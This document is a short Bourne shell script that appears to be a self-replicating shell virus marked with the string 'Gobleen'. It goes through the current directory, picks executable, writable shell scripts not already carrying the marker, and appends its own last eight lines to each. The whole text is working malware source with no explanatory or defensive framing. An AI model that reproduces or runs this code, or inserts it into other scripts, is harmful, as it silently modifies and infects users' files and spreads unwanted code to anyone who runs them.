for vic in *
do
 if [ ! -d $vic ] && [ -z "`grep -s Gobleen $vic`" -a -x $vic -a -w $vic ] ; then
  if [ -n "`file $vic | grep Bourne`" ] ; then
   echo >> $vic
   tail -n 8 $0 >> $vic
 fi; fi 
done